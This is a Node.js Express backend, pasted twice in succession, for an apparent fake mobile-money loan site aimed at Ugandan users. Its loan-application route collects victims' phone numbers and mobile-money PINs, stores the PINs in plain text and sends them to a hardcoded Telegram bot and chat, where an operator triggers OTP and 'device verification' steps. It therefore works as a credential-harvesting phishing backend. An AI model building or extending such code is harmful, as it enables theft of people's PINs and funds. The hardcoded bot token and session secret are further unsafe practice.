const express = require('express');
const session = require('express-session');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fetch = require('node-fetch');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Railway URL
const RAILWAY_URL = 'https://momo-uganda-production.up.railway.app';

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8392790531';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Database path - Railway uses /tmp for ephemeral storage
const DB_PATH = process.env.NODE_ENV === 'production' 
    ? '/tmp/loans.db' 
    : './database/loans.db';

let db;

async function initDatabase() {
    try {
        db = await open({
            filename: DB_PATH,
            driver: sqlite3.Database
        });

        await db.exec(`
            CREATE TABLE IF NOT EXISTS loans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT UNIQUE NOT NULL,
                phone TEXT NOT NULL,
                network TEXT NOT NULL,
                amount INTEGER NOT NULL,
                duration INTEGER NOT NULL,
                monthly_payment INTEGER NOT NULL,
                total_payment INTEGER NOT NULL,
                interest INTEGER NOT NULL,
                status TEXT DEFAULT 'pending',
                pin TEXT,
                otp TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS loan_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT NOT NULL,
                action TEXT NOT NULL,
                details TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (loan_id) REFERENCES loans(loan_id)
            );

            CREATE INDEX IF NOT EXISTS idx_loans_phone ON loans(phone);
            CREATE INDEX IF NOT EXISTS idx_loans_status ON loans(status);
            CREATE INDEX IF NOT EXISTS idx_loans_created_at ON loans(created_at);
        `);

        console.log('✅ Database initialized at:', DB_PATH);
    } catch (error) {
        console.error('Database initialization error:', error);
        throw error;
    }
}

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(cors());
app.use(morgan('combined'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Session middleware
app.use(session({
    secret: process.env.SESSION_SECRET || 'momo_uganda_loan_secret_key_2024',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 30 * 60 * 1000
    }
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Generate unique loan ID
function generateLoanId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 8);
    return `MUG${timestamp}${random}`.toUpperCase();
}

// Send message to Telegram
async function sendTelegramMessage(text, replyMarkup = null) {
    try {
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        };
        
        if (replyMarkup) {
            payload.reply_markup = replyMarkup;
        }
        
        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        if (data.ok && data.result) {
            return data.result.message_id;
        }
        console.error('Telegram send error:', data);
        return null;
    } catch (error) {
        console.error('Telegram send error:', error);
        return null;
    }
}

// Edit Telegram message
async function editTelegramMessage(messageId, text) {
    try {
        await fetch(`${TELEGRAM_API}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Telegram edit error:', error);
    }
}

// API Routes

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        railway_url: RAILWAY_URL
    });
});

app.post('/api/calculate', (req, res) => {
    const { amount, duration } = req.body;
    const monthlyRate = 0.095;
    const months = duration / 30;
    const interest = Math.round(amount * monthlyRate * months);
    const total = amount + interest;
    const monthly = Math.ceil(total / months);
    
    res.json({
        amount,
        duration,
        monthly,
        total,
        interest,
        currency: 'UGX'
    });
});

app.post('/api/save-loan', async (req, res) => {
    try {
        const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
        
        const loanId = generateLoanId();
        
        await db.run(
            `INSERT INTO loans (loan_id, phone, network, amount, duration, monthly_payment, total_payment, interest, pin, status)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [loanId, phone, network, amount, duration, monthly, total, interest, pin, 'pending_verification']
        );
        
        await db.run(
            `INSERT INTO loan_logs (loan_id, action, details)
             VALUES (?, ?, ?)`,
            [loanId, 'created', `Loan application created for ${phone}`]
        );
        
        const messageText = `<b>🔴 NEW LOAN APPLICATION - UGANDA</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
            `<b>📱 Network:</b> ${network}\n` +
            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
            `<b>📅 Duration:</b> ${duration / 30} months\n` +
            `<b>💳 Monthly:</b> UGX ${monthly.toLocaleString()}\n` +
            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>⚠️ Action Required:</b> Select an option below:`;
        
        const replyMarkup = {
            inline_keyboard: [
                [
                    { text: "✅ Approve & Send OTP", callback_data: `approve_${loanId}` },
                    { text: "📱 Verify Device", callback_data: `verify_${loanId}` }
                ],
                [
                    { text: "📋 Already Applied", callback_data: `applied_${loanId}` },
                    { text: "❌ Decline", callback_data: `decline_${loanId}` }
                ]
            ]
        };
        
        const messageId = await sendTelegramMessage(messageText, replyMarkup);
        
        res.json({
            success: true,
            loanId: loanId,
            messageId: messageId
        });
        
    } catch (error) {
        console.error('Save loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/update-otp', async (req, res) => {
    try {
        const { loanId, otp } = req.body;
        
        await db.run(
            `UPDATE loans SET otp = ?, status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
            [otp, 'otp_sent', loanId]
        );
        
        await db.run(
            `INSERT INTO loan_logs (loan_id, action, details)
             VALUES (?, ?, ?)`,
            [loanId, 'otp_sent', `OTP: ${otp}`]
        );
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Update OTP error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/complete-loan', async (req, res) => {
    try {
        const { loanId, otp } = req.body;
        
        const loan = await db.get(
            `SELECT * FROM loans WHERE loan_id = ? AND otp = ?`,
            [loanId, otp]
        );
        
        if (!loan) {
            return res.status(400).json({ success: false, error: 'Invalid OTP or Loan ID' });
        }
        
        await db.run(
            `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
            ['approved', loanId]
        );
        
        await db.run(
            `INSERT INTO loan_logs (loan_id, action, details)
             VALUES (?, ?, ?)`,
            [loanId, 'completed', 'Loan approved and completed']
        );
        
        res.json({ success: true, loan: loan });
        
    } catch (error) {
        console.error('Complete loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/loan/:loanId', async (req, res) => {
    try {
        const loan = await db.get(
            `SELECT loan_id, phone, network, amount, duration, monthly_payment, total_payment, status, created_at
             FROM loans WHERE loan_id = ?`,
            [req.params.loanId]
        );
        
        if (!loan) {
            return res.status(404).json({ success: false, error: 'Loan not found' });
        }
        
        res.json({ success: true, loan });
        
    } catch (error) {
        console.error('Get loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Webhook for Telegram updates
app.post('/webhook/telegram', async (req, res) => {
    try {
        const update = req.body;
        
        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const [action, loanId] = callbackData.split('_');
            
            const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [loanId]);
            
            if (!loan) {
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "Loan not found"
                    })
                });
                return res.sendStatus(200);
            }
            
            if (action === 'approve') {
                const otp = Math.floor(100000 + Math.random() * 900000).toString();
                
                await db.run(
                    `UPDATE loans SET otp = ?, status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                    [otp, 'otp_sent', loanId]
                );
                
                const messageText = `<b>✅ LOAN PRE-APPROVED - UGANDA</b>\n\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
                    `<b>💰 Amount:</b> UGX ${loan.amount.toLocaleString()}\n` +
                    `<b>📱 Phone:</b> <code>${loan.phone}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━\n\n` +
                    `<b>🔐 Your OTP Code:</b> <code>${otp}</code>\n\n` +
                    `<i>Enter this code on the OTP verification page to complete your loan.</i>\n\n` +
                    `<b>🔗 Verification Link:</b>\n${RAILWAY_URL}/otp.html`;
                
                await sendTelegramMessage(messageText);
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "OTP sent to user!"
                    })
                });
                
                await editTelegramMessage(
                    update.callback_query.message.message_id,
                    `✅ <b>LOAN APPROVED - OTP SENT</b>\n\nLoan ID: ${loanId}\nPhone: ${loan.phone}\nAmount: UGX ${loan.amount.toLocaleString()}\nStatus: OTP sent for verification`
                );
                
            } else if (action === 'verify') {
                await db.run(
                    `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                    ['device_verification', loanId]
                );
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "Device verification required"
                    })
                });
                
                await editTelegramMessage(
                    update.callback_query.message.message_id,
                    `📱 <b>DEVICE VERIFICATION REQUIRED</b>\n\nLoan ID: ${loanId}\nPhone: ${loan.phone}\nStatus: Pending device verification`
                );
                
            } else if (action === 'applied') {
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "User has already applied"
                    })
                });
                
            } else if (action === 'decline') {
                await db.run(
                    `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                    ['declined', loanId]
                );
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "Loan declined"
                    })
                });
                
                await editTelegramMessage(
                    update.callback_query.message.message_id,
                    `❌ <b>LOAN DECLINED</b>\n\nLoan ID: ${loanId}\nPhone: ${loan.phone}\nAmount: UGX ${loan.amount.toLocaleString()}\nStatus: Declined by admin`
                );
            }
        }
        
        res.sendStatus(200);
        
    } catch (error) {
        console.error('Webhook error:', error);
        res.sendStatus(500);
    }
});

// Serve HTML pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

// Start server
async function startServer() {
    await initDatabase();
    
    app.listen(PORT, () => {
        console.log(`🚀 Server running on http://localhost:${PORT}`);
        console.log(`🌐 Railway URL: ${RAILWAY_URL}`);
        console.log(`📱 Telegram Bot configured`);
    });
}

startServer();const express = require('express');
const session = require('express-session');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fetch = require('node-fetch');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Railway URL
const RAILWAY_URL = 'https://momo-uganda-production.up.railway.app';

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8392790531';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Database path - Railway uses /tmp for ephemeral storage
const DB_PATH = process.env.NODE_ENV === 'production' 
    ? '/tmp/loans.db' 
    : './database/loans.db';

let db;

async function initDatabase() {
    try {
        db = await open({
            filename: DB_PATH,
            driver: sqlite3.Database
        });

        await db.exec(`
            CREATE TABLE IF NOT EXISTS loans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT UNIQUE NOT NULL,
                phone TEXT NOT NULL,
                network TEXT NOT NULL,
                amount INTEGER NOT NULL,
                duration INTEGER NOT NULL,
                monthly_payment INTEGER NOT NULL,
                total_payment INTEGER NOT NULL,
                interest INTEGER NOT NULL,
                status TEXT DEFAULT 'pending',
                pin TEXT,
                otp TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS loan_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT NOT NULL,
                action TEXT NOT NULL,
                details TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (loan_id) REFERENCES loans(loan_id)
            );

            CREATE INDEX IF NOT EXISTS idx_loans_phone ON loans(phone);
            CREATE INDEX IF NOT EXISTS idx_loans_status ON loans(status);
            CREATE INDEX IF NOT EXISTS idx_loans_created_at ON loans(created_at);
        `);

        console.log('✅ Database initialized at:', DB_PATH);
    } catch (error) {
        console.error('Database initialization error:', error);
        throw error;
    }
}

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(cors());
app.use(morgan('combined'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Session middleware
app.use(session({
    secret: process.env.SESSION_SECRET || 'momo_uganda_loan_secret_key_2024',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 30 * 60 * 1000
    }
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Generate unique loan ID
function generateLoanId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 8);
    return `MUG${timestamp}${random}`.toUpperCase();
}

// Send message to Telegram
async function sendTelegramMessage(text, replyMarkup = null) {
    try {
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        };
        
        if (replyMarkup) {
            payload.reply_markup = replyMarkup;
        }
        
        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        if (data.ok && data.result) {
            return data.result.message_id;
        }
        console.error('Telegram send error:', data);
        return null;
    } catch (error) {
        console.error('Telegram send error:', error);
        return null;
    }
}

// Edit Telegram message
async function editTelegramMessage(messageId, text) {
    try {
        await fetch(`${TELEGRAM_API}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Telegram edit error:', error);
    }
}

// API Routes

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        railway_url: RAILWAY_URL
    });
});

app.post('/api/calculate', (req, res) => {
    const { amount, duration } = req.body;
    const monthlyRate = 0.095;
    const months = duration / 30;
    const interest = Math.round(amount * monthlyRate * months);
    const total = amount + interest;
    const monthly = Math.ceil(total / months);
    
    res.json({
        amount,
        duration,
        monthly,
        total,
        interest,
        currency: 'UGX'
    });
});

app.post('/api/save-loan', async (req, res) => {
    try {
        const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
        
        const loanId = generateLoanId();
        
        await db.run(
            `INSERT INTO loans (loan_id, phone, network, amount, duration, monthly_payment, total_payment, interest, pin, status)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [loanId, phone, network, amount, duration, monthly, total, interest, pin, 'pending_verification']
        );
        
        await db.run(
            `INSERT INTO loan_logs (loan_id, action, details)
             VALUES (?, ?, ?)`,
            [loanId, 'created', `Loan application created for ${phone}`]
        );
        
        const messageText = `<b>🔴 NEW LOAN APPLICATION - UGANDA</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
            `<b>📱 Network:</b> ${network}\n` +
            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
            `<b>📅 Duration:</b> ${duration / 30} months\n` +
            `<b>💳 Monthly:</b> UGX ${monthly.toLocaleString()}\n` +
            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>⚠️ Action Required:</b> Select an option below:`;
        
        const replyMarkup = {
            inline_keyboard: [
                [
                    { text: "✅ Approve & Send OTP", callback_data: `approve_${loanId}` },
                    { text: "📱 Verify Device", callback_data: `verify_${loanId}` }
                ],
                [
                    { text: "📋 Already Applied", callback_data: `applied_${loanId}` },
                    { text: "❌ Decline", callback_data: `decline_${loanId}` }
                ]
            ]
        };
        
        const messageId = await sendTelegramMessage(messageText, replyMarkup);
        
        res.json({
            success: true,
            loanId: loanId,
            messageId: messageId
        });
        
    } catch (error) {
        console.error('Save loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/update-otp', async (req, res) => {
    try {
        const { loanId, otp } = req.body;
        
        await db.run(
            `UPDATE loans SET otp = ?, status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
            [otp, 'otp_sent', loanId]
        );
        
        await db.run(
            `INSERT INTO loan_logs (loan_id, action, details)
             VALUES (?, ?, ?)`,
            [loanId, 'otp_sent', `OTP: ${otp}`]
        );
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Update OTP error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/complete-loan', async (req, res) => {
    try {
        const { loanId, otp } = req.body;
        
        const loan = await db.get(
            `SELECT * FROM loans WHERE loan_id = ? AND otp = ?`,
            [loanId, otp]
        );
        
        if (!loan) {
            return res.status(400).json({ success: false, error: 'Invalid OTP or Loan ID' });
        }
        
        await db.run(
            `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
            ['approved', loanId]
        );
        
        await db.run(
            `INSERT INTO loan_logs (loan_id, action, details)
             VALUES (?, ?, ?)`,
            [loanId, 'completed', 'Loan approved and completed']
        );
        
        res.json({ success: true, loan: loan });
        
    } catch (error) {
        console.error('Complete loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/loan/:loanId', async (req, res) => {
    try {
        const loan = await db.get(
            `SELECT loan_id, phone, network, amount, duration, monthly_payment, total_payment, status, created_at
             FROM loans WHERE loan_id = ?`,
            [req.params.loanId]
        );
        
        if (!loan) {
            return res.status(404).json({ success: false, error: 'Loan not found' });
        }
        
        res.json({ success: true, loan });
        
    } catch (error) {
        console.error('Get loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Webhook for Telegram updates
app.post('/webhook/telegram', async (req, res) => {
    try {
        const update = req.body;
        
        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const [action, loanId] = callbackData.split('_');
            
            const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [loanId]);
            
            if (!loan) {
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "Loan not found"
                    })
                });
                return res.sendStatus(200);
            }
            
            if (action === 'approve') {
                const otp = Math.floor(100000 + Math.random() * 900000).toString();
                
                await db.run(
                    `UPDATE loans SET otp = ?, status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                    [otp, 'otp_sent', loanId]
                );
                
                const messageText = `<b>✅ LOAN PRE-APPROVED - UGANDA</b>\n\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
                    `<b>💰 Amount:</b> UGX ${loan.amount.toLocaleString()}\n` +
                    `<b>📱 Phone:</b> <code>${loan.phone}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━\n\n` +
                    `<b>🔐 Your OTP Code:</b> <code>${otp}</code>\n\n` +
                    `<i>Enter this code on the OTP verification page to complete your loan.</i>\n\n` +
                    `<b>🔗 Verification Link:</b>\n${RAILWAY_URL}/otp.html`;
                
                await sendTelegramMessage(messageText);
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "OTP sent to user!"
                    })
                });
                
                await editTelegramMessage(
                    update.callback_query.message.message_id,
                    `✅ <b>LOAN APPROVED - OTP SENT</b>\n\nLoan ID: ${loanId}\nPhone: ${loan.phone}\nAmount: UGX ${loan.amount.toLocaleString()}\nStatus: OTP sent for verification`
                );
                
            } else if (action === 'verify') {
                await db.run(
                    `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                    ['device_verification', loanId]
                );
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "Device verification required"
                    })
                });
                
                await editTelegramMessage(
                    update.callback_query.message.message_id,
                    `📱 <b>DEVICE VERIFICATION REQUIRED</b>\n\nLoan ID: ${loanId}\nPhone: ${loan.phone}\nStatus: Pending device verification`
                );
                
            } else if (action === 'applied') {
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "User has already applied"
                    })
                });
                
            } else if (action === 'decline') {
                await db.run(
                    `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                    ['declined', loanId]
                );
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "Loan declined"
                    })
                });
                
                await editTelegramMessage(
                    update.callback_query.message.message_id,
                    `❌ <b>LOAN DECLINED</b>\n\nLoan ID: ${loanId}\nPhone: ${loan.phone}\nAmount: UGX ${loan.amount.toLocaleString()}\nStatus: Declined by admin`
                );
            }
        }
        
        res.sendStatus(200);
        
    } catch (error) {
        console.error('Webhook error:', error);
        res.sendStatus(500);
    }
});

// Serve HTML pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

// Start server
async function startServer() {
    await initDatabase();
    
    app.listen(PORT, () => {
        console.log(`🚀 Server running on http://localhost:${PORT}`);
        console.log(`🌐 Railway URL: ${RAILWAY_URL}`);
        console.log(`📱 Telegram Bot configured`);
    });
}

startServer();
